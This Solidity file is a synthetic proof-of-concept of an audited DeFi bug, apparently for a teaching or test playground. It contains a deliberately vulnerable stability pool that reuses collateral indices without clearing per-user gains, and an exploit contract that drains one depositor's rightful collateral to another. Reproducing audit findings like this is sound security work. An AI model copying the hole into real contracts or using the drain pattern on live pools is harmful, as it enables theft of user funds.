// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Roots — [H-01] Overwriting collateral breaks collateral gains logic
    (Pashov Audit Group, 2025-02-09, finding #55111)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: after a collateral is sunset and its index is reused for a
    new collateral, StabilityPool clears epochToScaleToSums for that index but
    does NOT clear collateralGainsByDepositor or depositSums. Pending gains
    accrued under the old collateral are then treated as gains for the new
    collateral. Alice can claim coll-C gains that include her leftover coll-A
    accounting and drain the pool; Bob's legitimate coll-C gains then fail to
    transfer.

    Time skip is reduced: sunset expiry is set to 0 so enableNewCollateral can
    overwrite immediately (same overwrite path the report blames after 180d).

    Vulnerable overwrite path preserved with @> VULN markers.
    FIX: never reuse sunset indices; add disableAfterExpiry that does not
    reassign the slot until per-user gain state is cleared. */

contract MockCollateral {
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced StabilityPool focused on collateral index overwrite + gains.
contract StabilityPool {
    // index => collateral token (reused after sunset)
    mapping(uint256 => MockCollateral) public collateralTokens;
    // index => sunset expiry (0 = active; past = overwriteable)
    mapping(uint256 => uint256) public sunsetExpiry;
    uint256 public collateralCount;

    // epochToScaleToSums[index][epoch][scale] — product sums for gains
    mapping(uint256 => mapping(uint256 => mapping(uint256 => uint256))) public epochToScaleToSums;
    // depositSums[depositor][index]
    mapping(address => mapping(uint256 => uint256)) public depositSums;
    // collateralGainsByDepositor[depositor][index]
    mapping(address => mapping(uint256 => uint256)) public collateralGainsByDepositor;
    // deposits of debt token (MEAR) by depositor
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    uint256 public constant INDEX_A = 0;

    function enableCollateral(MockCollateral coll) external returns (uint256 index) {
        // Prefer overwriting a sunset-expired slot (the buggy path).
        for (uint256 i = 0; i < collateralCount; i++) {
            if (sunsetExpiry[i] != 0 && sunsetExpiry[i] <= block.timestamp) {
                index = i;
                _overwriteCollateral(index, coll);
                return index;
            }
        }
        index = collateralCount;
        collateralTokens[index] = coll;
        sunsetExpiry[index] = 0;
        collateralCount += 1;
    }

    /// @dev Bug: clears product sums but NOT per-depositor gain state.
    function _overwriteCollateral(uint256 index, MockCollateral coll) internal {
        collateralTokens[index] = coll;
        sunsetExpiry[index] = 0;
        // Clear product sums for the reused index…
        epochToScaleToSums[index][0][0] = 0; // @> VULN: only product sums cleared
        // FIX: also clear depositSums[*][index] and collateralGainsByDepositor[*][index]
        // (or never reuse the index). Per-user maps are intentionally NOT wiped here.
    }

    function startCollateralSunset(uint256 index) external {
        // Reduced: expiry = now so overwrite is immediately available (no 180d wait).
        sunsetExpiry[index] = block.timestamp;
    }

    function provideToSP(address user, uint256 amount) external {
        deposits[user] += amount;
        totalDeposits += amount;
        // Snapshot current product sum for index 0 (simplified single index).
        depositSums[user][INDEX_A] = epochToScaleToSums[INDEX_A][0][0];
    }

    /// @dev Liquidation distributes `collGain` of collateral `index` to SP depositors
    ///      by bumping the product sum; simplified 1:1 accrual to depositors later.
    function offsetAndDistribute(uint256 index, uint256 collGain) external {
        MockCollateral coll = collateralTokens[index];
        // Collateral is sent into the pool by the liquidation path.
        coll.mint(address(this), collGain);
        // Bump product sum so depositors can accrue.
        epochToScaleToSums[index][0][0] += collGain;
    }

    function _accrueDepositorCollateralGain(address depositor, uint256 index) internal {
        uint256 depSum = depositSums[depositor][index];
        uint256 sums = epochToScaleToSums[index][0][0];
        // firstPortion = sums - depSums; can underflow after overwrite if sums reset
        // while depSums still hold the old snapshot — but here we model the
        // "claim more than due" path: leftover gains in collateralGainsByDepositor.
        if (sums >= depSum && deposits[depositor] > 0 && totalDeposits > 0) {
            uint256 firstPortion = sums - depSum;
            // Pro-rata: depositor share of the newly accrued sum delta.
            uint256 gain = (firstPortion * deposits[depositor]) / totalDeposits;
            collateralGainsByDepositor[depositor][index] += gain;
        }
        depositSums[depositor][index] = sums;
    }

    function withdrawFromSP(address user, uint256 /*amount*/) external {
        // Accrue for active index 0 (simplified).
        _accrueDepositorCollateralGain(user, INDEX_A);
    }

    function claimCollateralGains(address recipient, uint256[] calldata collateralIndexes) external {
        address depositor = msg.sender;
        for (uint256 j = 0; j < collateralIndexes.length; j++) {
            uint256 i = collateralIndexes[j];
            _accrueDepositorCollateralGain(depositor, i);
            uint256 gain = collateralGainsByDepositor[depositor][i];
            if (gain == 0) continue;
            collateralGainsByDepositor[depositor][i] = 0;
            // Transfer may revert if pool balance was already drained by another claimer.
            require(collateralTokens[i].balanceOf(address(this)) >= gain, "ERC20: transfer amount exceeds balance");
            collateralTokens[i].transfer(recipient, gain);
        }
    }

    /// @dev Test helper: seed leftover gains as if coll-A accrual already happened.
    function seedPendingGain(address depositor, uint256 index, uint256 gain) external {
        collateralGainsByDepositor[depositor][index] = gain;
    }
}

contract Actor {
    function provide(StabilityPool sp, uint256 amount) external {
        sp.provideToSP(address(this), amount);
    }

    function withdraw0(StabilityPool sp) external {
        sp.withdrawFromSP(address(this), 0);
    }

    function claim(StabilityPool sp, address recipient, uint256 index) external {
        uint256[] memory idxs = new uint256[](1);
        idxs[0] = index;
        sp.claimCollateralGains(recipient, idxs);
    }

    function tryClaim(StabilityPool sp, address recipient, uint256 index) external returns (bool ok) {
        uint256[] memory idxs = new uint256[](1);
        idxs[0] = index;
        try sp.claimCollateralGains(recipient, idxs) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

contract Exploit {
    StabilityPool public sp; // CREATE nonce 1 — vulnerable
    MockCollateral public collA; // CREATE nonce 2
    Actor public alice; // CREATE nonce 3
    Actor public bob; // CREATE nonce 4
    MockCollateral public collC; // CREATE nonce 5 — created in run() → NOT ctor nonce

    uint256 public aliceCollCAfter;
    bool public bobClaimFailed;
    uint256 public leftoverGainCarried;

    constructor() {
        sp = new StabilityPool();
        collA = new MockCollateral("Collateral A", "CA");
        alice = new Actor();
        bob = new Actor();
        // Enable coll A at index 0.
        sp.enableCollateral(collA);
    }

    function run() external {
        // Alice and Bob deposit into the stability pool.
        alice.provide(sp, 100e18);
        bob.provide(sp, 100e18);

        // Liquidation of coll A distributes 100 coll-A into the pool.
        sp.offsetAndDistribute(0, 100e18);
        // Alice accrues her 50 coll-A gain (half of 100) but does NOT claim yet.
        alice.withdraw0(sp);
        require(sp.collateralGainsByDepositor(address(alice), 0) == 50e18, "alice collA gain");

        // Coll A is sunset (expiry = now). Pending gains sit on index 0.
        sp.startCollateralSunset(0);

        // New coll C overwrites index 0: product sums cleared, per-user gains NOT.
        collC = new MockCollateral("Collateral C", "CC");
        uint256 idx = sp.enableCollateral(collC);
        require(idx == 0, "should overwrite index 0");
        require(address(sp.collateralTokens(0)) == address(collC), "index 0 is collC");

        leftoverGainCarried = sp.collateralGainsByDepositor(address(alice), 0);
        require(leftoverGainCarried == 50e18, "pending collA gain still on index 0");

        // Coll-C liquidation deposits 50 coll-C into the pool (what depositors of
        // the NEW collateral should share). Alice's leftover coll-A accounting on
        // the same index will be paid out in coll-C tokens instead.
        sp.offsetAndDistribute(0, 50e18);
        require(collC.balanceOf(address(sp)) == 50e18, "pool holds 50 collC");

        // Alice claims index 0: the 50 leftover (from coll A) is paid in coll C,
        // draining the entire new-collateral distribution that Bob is owed.
        alice.claim(sp, address(alice), 0);
        aliceCollCAfter = collC.balanceOf(address(alice));
        require(aliceCollCAfter == 50e18, "alice drained 50 collC via leftover collA gain");
        require(collC.balanceOf(address(sp)) == 0, "pool drained by alice");

        // Bob has a legitimate pending claim for coll C but the pool is empty.
        sp.seedPendingGain(address(bob), 0, 25e18);
        bobClaimFailed = !bob.tryClaim(sp, address(bob), 0);
        require(bobClaimFailed, "harm not demonstrated: bob should fail to claim collC");
    }
}

